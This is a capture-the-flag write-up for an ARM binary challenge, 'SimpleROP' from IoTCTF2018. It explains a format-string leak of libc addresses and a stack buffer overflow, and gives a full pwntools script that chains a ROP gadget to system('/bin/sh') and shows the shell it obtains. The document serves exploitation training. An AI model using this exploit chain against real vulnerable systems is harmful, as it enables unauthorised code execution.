# SimpleROP - 1000

> You will need access into Home Invasion network to complete this challenge. There is only one flag in this challenge.
>  
> Its simple!
>  
> nc 192.168.51.12 10002

We did not manage to solve this challenge during the competition. It was largely because we were too used to x86 and did not think carefully. After 2 weeks, we finally managed to crack this challenge. We shall share with you in this writeup how to solve the challenge. 

### Solution

Before we began, we changed the program's dynamic dependency to use the shared libraries that came with the challenge. The change was necesary as without it, it was impossible for us to craft the exploit locally. Before the change, this was the program's dynamic dependency:

```
pi@raspberrypi:~/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/simplerop_1000 $ ldd simplerop 
	linux-vdso.so.1 (0x7ea63000)
	libc.so.6 => /lib/arm-linux-gnueabihf/libc.so.6 (0x76dcc000)
	/usr/lib/arm-linux-gnueabihf/libarmmem.so (0x76db6000)
	/lib/ld-linux-armhf.so.3 (0x54b18000)
```

We tried both `LD_PRELOAD` and `LD_LIBRARY_PATH` but they did not work. They kept getting SEGFAULT.

> Fortunately nowadays we have a simple solution to this problem (as commented in one of his replies), using patchelf. 
>  
> --[Stackoverflow](https://stackoverflow.com/questions/847179/multiple-glibc-libraries-on-a-single-host)

So, we used `patchelf` to do the change for us. 

```
pi@raspberrypi:~/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/simplerop_1000 $ patchelf --set-interpreter /home/pi/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/simplerop_1000/lib/libc.so.6 simplerop
pi@raspberrypi:~/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/simplerop_1000 $ patchelf --set-rpath /home/pi/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/simplerop_1000/lib/ simplerop
```

`ldd` confirms that the change was successful.

```
pi@raspberrypi:~/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/simplerop_1000 $ ldd simplerop 
	linux-vdso.so.1 (0x7eb8a000)
	libc.so.6 => /home/pi/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/simplerop_1000/lib/libc.so.6 (0x76e3c000)
	/usr/lib/arm-linux-gnueabihf/libarmmem.so (0x76e26000)
	/home/pi/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/simplerop_1000/lib/libc.so.6 => /lib/ld-linux-armhf.so.3 (0x54b92000)
```

With the shared libraries out of the way, we looked at the symbols table. There were 2 values that stood out - `stdout@GLIBC_2.4` and `stdin@GLIBC_2.4`. This meant that the real addresses of the IO stream objects were located in the program's memory. This is key to solving the challenge.
```
➜  simplerop_1000 git:(master) ✗ readelf -s simplerop 

Symbol table '.dynsym' contains 12 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
[...]
     6: 00021044     4 OBJECT  GLOBAL DEFAULT   24 stdout@GLIBC_2.4 (2)
[...]
     9: 00021040     4 OBJECT  GLOBAL DEFAULT   24 stdin@GLIBC_2.4 (2)
[...]
➜  simplerop_1000 git:(master) ✗ 
```

Turns out, those two values were in the `.bss` section.
```
➜  simplerop_1000 git:(master) ✗ readelf -S simplerop
There are 28 section headers, starting at offset 0x419c:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
[...]
  [24] .bss              NOBITS          00021040 00403c 00000c 00  WA  0   0  8
[...]
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  y (purecode), p (processor specific)
➜  simplerop_1000 git:(master) ✗ 
```

We played around with the program and realised that it is possible to conduct a format string attack as well as a buffer overflow.
```
pi@raspberrypi:~/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/simplerop_1000 $ ./simplerop 
What is your name? 
%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x
0_1_7e977f44_0_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_76ea000a_10660
, leave a message: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbccccccccccccccccccccccccccdddddddddddddddddddddddeeeeeeeeeeeeeeeeeeeeeefffffffffffffffffffffffffffffffffggggggggggggggggggggggghhhhhhhhhhhhhhhhhhhhhhhhhhh
Segmentation fault
pi@raspberrypi:~/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/simplerop_1000 $
```
### Buffer overflow + Stack smashing

We wanted to see why there was a segmentation fault. From the disassembly of the `<main>` function, we realised that `<read>` read 256 characters into a buffer that was only 100 characters large. There was also no stack canary too. It was the classic beginner's stack smashing via buffer overflow. (Actually, we weren't able to find `<main>` using Radare2. It was BinaryNinja that was able to automatically identify said function as `<main>`)

```
/ (fcn) aav.0x000105c4 104
|   aav.0x000105c4 ();
|           ; UNKNOWN XREF from 0x00010488 (fcn.0x105c4 + 52)
|           0x000105c4      00482de9       push {fp, lr}
|           0x000105c8      04b08de2       add fp, sp, 4
|           0x000105cc      68d04de2       sub sp, sp, 0x68            ; 'h'
[...]
|           0x00010608      68304be2       sub r3, fp, 0x68
|           0x0001060c      012ca0e3       mov r2, 0x100               ; 256
|           0x00010610      0310a0e1       mov r1, r3
|           0x00010614      0000a0e3       mov r0, 0
|           0x00010618      78ffffeb       bl sym.imp.read             ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x0001061c      0030a0e3       mov r3, 0
|           0x00010620      0300a0e1       mov r0, r3
|           0x00010624      04d04be2       sub sp, fp, 4
\           0x00010628      0088bde8       pop {fp, pc}
[0x00010454]> 
```

We thought we could give shellcode instructions as input to the buffer, then return to said buffer to get a shell. However, the stack was not executable.
```
$ readelf -l simplerop 

Elf file type is EXEC (Executable file)
Entry point 0x10454
There are 9 program headers, starting at offset 52
[...]
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
[...]
```

That meant only Ret2LibC and ROP were viable exploit options. Ret2LibC requires the knowledge of the shared library's base address. That in turn required knowledge of the real address of any libc's function/object in runtime and its offset. The format string exploit we identifed earlier was the perfect candidate to find the former.

### Format string exploit

We used the format string attack to read into the `.bss` section to get the real addresses of the libc's stdin and stdout IO stream objects. To read the values at address `0x21040`, we had to use the `"%s"` format string specifier with said address as the argument. It took trial and error to get the correct number of `"%p"` to skip through the string. We added the padding `"AAAA"` so it'd be easier to identify the `bss_addr`. This was our first attempt:
```
from pwn import *

context.arch = 'arm'
r = process('./simplerop')
elf = ELF('lib/libc.so.6')

bss_addr = p32(0x21040)

name = "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%pAAAA" + bss_addr + "BBBB"

r.recvuntil("What is your name? \n")

r.sendline(name)

r.recvuntil('0x41414141')

print r.recvuntil('leave a message: ')
```
```
(nil)0x10x7ef66f44(nil)0x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x414141410x210400x424242420x76e0000a0x7ef66fb0AAAA@\x10, leave a message: 
```

The padding "BBBB" did not show as `<fgets>` only reads until the null character, which is present at the end of `bss_addr`. The string literal of `0x21040` in little-endianness is `\x40\x10\x02\x00`. The `\x00` was interpreted as the null character.

Since there were 3 extra DWORDs printed after `"[...]_0x21040_[...]"`, we replaced 3 `"%p"` with `"__"`. That way the position of `bss_addr` remained unchanged in the stack, and the last `"%p"` would print the value `"0x21040"`.
```
name = "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p______AAAA" + bss_addr + "BBBB"
```
```
(nil)0x10x7ef66f44(nil)0x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x414141410x21040AAAA@\x10, leave a message: 
```

Now that we got the correct number of `"%p"`s, we replaced last `"%p"` with `"%s"` to read the values at address `0x21040`.
```
name = "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s______AAAA" + bss_addr + "BBBB"
```
```
(nil)0x10x7e83bf44(nil)0x702570250x702570250x702570250x702570250x702570250x702570250x702570250x5f5f73250x5f5f5f5f0x41414141\xa0��v@��v______AAAA@\x10, leave a message: 
```

We finally got the real addresses of the IO stream objects. We modified the exploit script to print the hex values present in the `.bss` segment as hex strings instead of string literals.
```
from pwn import *
context.arch = 'arm'
r = process('./simplerop')
elf = ELF('lib/libc.so.6')
bss_addr = p32(0x21040)
name = "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s______AAAA" + bss_addr + "BBBB"
r.recvuntil("What is your name? \n")
r.sendline(name)
r.recvuntil('0x41414141')
bss_values = r.recvuntil('______')[0:8]
stdin_addr = u32(bss_values[0:4])
stdout_addr = u32(bss_values[4:8])
print stdin_addr
print stdout_addr
[...]
```

After running the script, we got the addresses of the `stdin` and `stdout` stream objects in the shared library `lib/libc.so.6` during runtime.
```
0x76f9f650
0x76f9fd60
```

Next, we found the offset of the IO stream objects.

```
pi@raspberrypi:~/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/simplerop_1000 $ readelf -s lib/libc.so.6 | grep "stdin"
   351: 000ea650   160 OBJECT  GLOBAL DEFAULT   31 _IO_2_1_stdin_@@GLIBC_2.4
   515: 000eae08     4 OBJECT  GLOBAL DEFAULT   31 stdin@@GLIBC_2.4
pi@raspberrypi:~/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/simplerop_1000 $ readelf -s lib/libc.so.6 | grep "stdout"
   801: 000ead60   160 OBJECT  GLOBAL DEFAULT   31 _IO_2_1_stdout_@@GLIBC_2.4
  1040: 000eae04     4 OBJECT  GLOBAL DEFAULT   31 stdout@@GLIBC_2.4
```

We initially thought the offsets for `stdin` and `stdout` were `0x000eae08` and `0x000eae04` respectively. However, they would get entirely different base addresses.
```
```

Thus, we knew the offsets for `stdin` and `stdout` had to be `0x000ea650` and `0x000ead60` respectively
In the case of the output of the real addresses above, the base address was `0x76eb5000`.

We now had the base address of the libc shared library. We knew we wanted to call `system('/bin/sh')`. Following ARM calling convention, that meant setting the registers:
```
r0 to the address of the string "/bin/sh" (1st argument)
r1 to 0x0 (2nd argument)
r2 to 0x0 (3rd argument)
```

We found the offset of "/bin/sh" in the shared library.
```
➜  lib git:(master) ✗ strings -t x libc.so.6 | grep "/bin/sh"
  cc728 /bin/sh
➜  lib git:(master) ✗
```

We found 1 ROP gadget - `pop {r0, r1, r2, r3, r4, r6, r7, pc}` - to change the values of the registers to the required values above. There were other ROP gadgets setting just the values of registers `r0, r1 and r2`. We chose this one by random. We had no use for the other registers `r3, r4, r6 and r7`, so we just set them all to `0x0`.

![](../../iot_ctf2018_simplerop_ropshell.png)

After that, we returned into the `<system>` function in libc. Thus, our input looked like this:

```
-------------------------
|Padding	 	|	
|			|
|"A" * 0x68		|
-------------------------
|Addr of ROP gadget	|	
-------------------------
|Addr of "/bin/sh"	|	-> r0
-------------------------
|0x0			|	-> r1
-------------------------
|0x0			|	-> r2
-------------------------
|0x0			|	-> r3
-------------------------
|0x0			|	-> r4
-------------------------
|0x0			|	-> r5
-------------------------
|0x0			|	-> r6
-------------------------
|0x0			|	-> r7
-------------------------
|Addr of <system>	|	-> pc
-------------------------
```


This is our entire Python script:
```
from pwn import *

context.arch = 'arm'
#r = remote('192.168.51.12', 10002)
r = process('./simplerop')
elf = ELF('lib/libc.so.6')


binsh_offset = int(elf.search('/bin/sh').next())
system_offset = int(elf.symbols['system'])
stdin_offset = int(elf.symbols['_IO_2_1_stdin_'])
stdout_offset = int(elf.symbols['_IO_2_1_stdout_'])
pop_offset = int(0x00042a4f)	#using ROPshell

bss_addr = p32(0x21040)

print "/bin/sh offset : " + hex(binsh_offset)
print "<system> offset : " + hex(system_offset)
print "stdin@GLIBC offset : " + hex(stdin_offset)
print "stdout@GLIBC offset : " + hex(stdout_offset)
print "pop {r0, r1, r2, r3, r4, r6, r7, pc} offset : " + hex(pop_offset) 

name = "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%s______AAAA" + bss_addr + "BBBB"

r.recvuntil("What is your name? \n")

r.sendline(name)

r.recvuntil('0x41414141')

bss_values = r.recvuntil('______')[0:12]
stdin_addr = u32(bss_values[0:4])
stdout_addr = u32(bss_values[4:8])

print hex(stdin_addr)
print hex(stdin_offset)
print hex(stdout_addr)
print hex(stdout_offset)

base_addr = stdin_addr - stdin_offset
assert base_addr == (stdout_addr - stdout_offset)

binsh_addr = binsh_offset + base_addr
system_addr = system_offset + base_addr
pop_addr = pop_offset + base_addr

print "Base address: " + hex(base_addr)

r.recvuntil('leave a message:')

exploit = "a" * 0x68
exploit += p32(pop_addr)
exploit += p32(binsh_addr)
exploit += p32(0x0)
exploit += p32(0x0)
exploit += p32(0x0)
exploit += p32(0x0)
exploit += p32(0x0)
exploit += p32(0x0)
exploit += p32(system_addr)

r.sendline(exploit)

r.interactive()
```

After running the script, we got ourselves a shell. If only we realised it during the competition...
```
pi@raspberrypi:~/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/simplerop_1000 $ python soln_simplerop.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process './simplerop': pid 4348
[*] '/home/pi/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/simplerop_1000/lib/libc.so.6'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
/bin/sh offset : 0xcc728
<system> offset : 0x2c585
stdin@GLIBC offset : 0xea650
stdout@GLIBC offset : 0xead60
pop {r0, r1, r2, r3, r4, r6, r7, pc} offset : 0x42a4f
0x76fa9650
0xea650
0x76fa9d60
0xead60
Base address: 0x76ebf000
[*] Switching to interactive mode
 $ whoami
pi
$ ls
core                    lib        simplerop
iot_ctf2018_simplerop_ropshell.png  README.md  soln_simplerop.py
$  
```

